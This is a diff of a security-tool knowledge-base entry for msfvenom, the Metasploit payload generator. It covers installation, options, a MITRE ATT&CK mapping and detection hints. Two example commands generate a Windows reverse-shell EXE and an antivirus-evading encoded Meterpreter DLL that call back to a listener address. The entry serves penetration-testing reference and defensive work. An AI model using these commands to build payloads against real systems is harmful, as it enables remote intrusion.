@@ -1,72 +1,122 @@
 ---
-id: 433e21c7-de2a-4a52-a3b0-202514278430
-name: msfvenom
+id: tool-msfvenom-001
+url: >-
+  https://docs.metasploit.com/docs/using-metasploit/advanced/metasploit-payloads.html
+tags:
+  - metasploit
+  - payload
+  - exploitation
 type: tool
 verified: false
-created_at: '2019-08-28T21:17:32.300229+00:00'
-updated_at: '2023-05-29T16:48:53.029709+00:00'
-commands:
-- '[[msfvenom Execute Calculator]]'
-- '[[msfvenom Generate a Generic Windows x64 Reverse Shell]]'
-- '[[msfvenom JAVA Meterpreter reverse shell]]'
-- '[[msfvenom Meterpreter PHP script reverse shell]]'
-- '[[msfvenom Meterpreter elf reverse shell]]'
-- '[[msfvenom Meterpreter python script listener]]'
-- '[[msfvenom Powershell Script Reverse Shell]]'
-- '[[msfvenom Windows Reverse Shell]]'
-- '[[msfvenom python script reverse shell]]'
 platforms:
-- Linux
-tags:
-- '[[Payload]]'
+  - Linux
+  - Windows
+  - macOS
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:29:19.606Z'
+validated: true
+submitted: true
 ---
-
 # msfvenom
+
+**Status**: Unverified
 
 ## Overview
 
-MSFVenom is a payload generation tool, and part of the Metasploit framework. It allows users to create various payloads for deployment on targets, including command execution, reverse shells, etc, along with the ability to encode, encrypt, and output payloads in various formats such as raw bytes, P
+msfvenom is a command-line tool from the Metasploit Framework for generating custom payloads, encoders, and executables for penetration testing and exploit development. It is primarily used to create shellcode, DLLs, and EXEs that can be embedded in attacks like DLL hijacking or file drops.
 
 ## Description
 
-# Description
+msfvenom combines MSFencode and msfpayload into a single utility, supporting over 1,000 payloads across platforms. In offensive operations, it's used to craft stealthy payloads for RCE, reverse shells, and post-exploitation. Features include encoding to evade AV, format conversion (e.g., raw to DLL), and template integration.
 
-MSFVenom is a payload generation tool, and part of the Metasploit framework. It allows users to create various payloads for deployment on targets, including command execution, reverse shells, etc, along with the ability to encode, encrypt, and output payloads in various formats such as raw bytes, PowerShell scripts, C, Perl, etc. While MSFVenom includes a number of Metasploit specific payloads, it includes countless generic payloads, including shells that can be accessed with a simple netcat session. 
+## Features
+
+- Feature 1: Payload selection from databases (e.g., reverse_tcp, meterpreter)
+- Feature 2: Built-in encoders and iteration for obfuscation
+- Feature 3: Output in multiple formats (EXE, DLL, ELF, APK)
+
+## Installation
+
+### Requirements
+
+- Ruby 2.7+ and dependencies
+- Kali Linux or Metasploit-compatible OS
+
+### Install Commands
+
+```bash
+# On Kali/Debian
+sudo apt update && sudo apt install metasploit-framework
+
+# Or from source
+git clone https://github.com/rapid7/metasploit-framework
+cd metasploit-framework && bundle install
+```
+
+## Basic Usage
+
+```bash
+msfvenom --help
+```
+
+## Common Options
+
+| Option | Description |
+|--------|-------------|
+| `-p` | Payload to use |
+| `-f` | Output format |
+| `-e` | Encoder for payload |
+| `-i` | Encoding iterations |
+| `-a` | Architecture (x86, x64) |
+
+## Examples
+
+### Example 1: Basic Usage
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe > shell.exe
+```
+
+Generates a reverse shell EXE.
+
+### Example 2: Advanced Usage
+
+```bash
+msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 -f dll -e x64/shikata_ga_nai -i 3 > payload.dll
+```
+
+Creates encoded DLL with HTTPS Meterpreter.
+
+## MITRE ATT&CK Mapping
+
+This tool is commonly associated with:
+
+### Techniques
+
+- [[Process Injection]]
+- [[Obfuscated Files or Information]]
+
+### Tactics
+
+- [[Execution]]
+- [[Privilege Escalation]]
+
+## Detection
+
+Indicators and methods for detecting this tool's usage:
+
+- Detection method 1: AV signatures for generated payloads (focus on entropy, strings)
+- Detection method 2: Network beacons to common C2 ports during testing
+
+## Related Procedures
 
 
+## Related Tools
 
-# Example
+- [[Related Tool: Metasploit Framework]]
+- [[Related Tool: Cobalt Strike]]
 
+## References
 
-
-{{EMBEDDED_COMMAND_8dd58733-1c07-4ca7-88aa-994a9b3ed2a7}}
-
-
-
-# Installation
-
-## Install on Debian/Ubuntu
-
-MSFVenom is installed alongside the Metasploit Framework, which can be installed with:
-
-
-
-
-
-
-
-
-
-## Platforms
-
-- Linux
-
-## Commands (1)
-
-- [[msfvenom Execute Calculator]]
-
-## Tags
-
-- [[Payload]]
-
-
+- Official documentation: https://docs.metasploit.com
+- Related resources: PayloadsAllTheThings GitHub
